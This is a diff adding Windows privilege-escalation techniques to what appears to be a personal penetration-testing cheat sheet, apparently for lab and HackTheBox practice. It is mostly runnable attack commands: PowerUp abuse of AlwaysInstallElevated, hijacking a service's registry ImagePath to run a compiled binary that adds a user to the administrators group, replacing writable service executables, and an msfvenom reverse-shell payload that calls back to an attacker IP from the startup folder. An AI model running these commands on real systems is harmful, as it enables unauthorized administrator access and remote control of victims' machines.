@@ -1523,6 +1523,55 @@ hostname # You will get name of the host, check for bash history
 
 # Runas process here https://ashokreddyz.medium.com/access-hackthebox-windows-privileges-escalation-046aed801fb6
 cmdkey /list
+
+# Escalation with Registry
+Autoruns64.exe #SysInternal tools
+
+# Registry Escalation - AlwaysInstallElevated
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer # If it's set to 1 or 0x1 then AlwaysInstallElevated ON
+# Other way
+powershell.exe -exec bypass
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+# in this sectionAlwaysInstallElevated registry Key
+AbuseFunction: Write-UserAddMSI #It will create .msi, execute check the users in admin group
+
+# Service Escalation - Registry,
+# Service escation dealing with registry, if have full control over the registry key, we can do compile malicious executable written c, 
+#-in the add a user, in compile file and then done.
+Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+# Check if have NT Authority\INTERACTIVE Allow FullControl acces permission then continue the process
+cmd.exe /k net localgroup administrators user /add # Repalce with this "whoami > c:\\windows\\temp\\service.txt",  It will add user in admin group
+# this file https://raw.githubusercontent.com/sagishahar/scripts/refs/heads/master/windows_service.c,
+x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64')
+net localgroup administrators
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+sc start regsvc
+#It will create start file
+net localgroup administrators
+
+
+# Service Escalation - Executable Files
+Powershell -ep bypass
+. .\PowerUp.ps1
+All-AllChecks
+#Check if have any executable permission to file, also check with accesschk64.exe
+accesschk64.exe -wvu “PATH”
+# If you have RW Everyone with FILE_ALL_SYSTEM
+# Then replace the file
+sc start "Name of The Service" # You'll get in powerup.ps1, Invoke-AllChecks command.
+
+
+# Escalation Path - Startup Applications
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+# From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.
+msfvenom -p windows/shell_reverse_tcp LHOST=10.6.17.98 LPORT=443 -f exe -o program.exe
+#Put file on the path, start the service, restart system or switch the user
+# You will get user
+
+
+# Escalation Path - DLL Hijacking
+https://www.udemy.com/course/draft/2994784/learn/lecture/19449784#questions/16528788, 
 ```
 
 ## Manual Enumeration commands
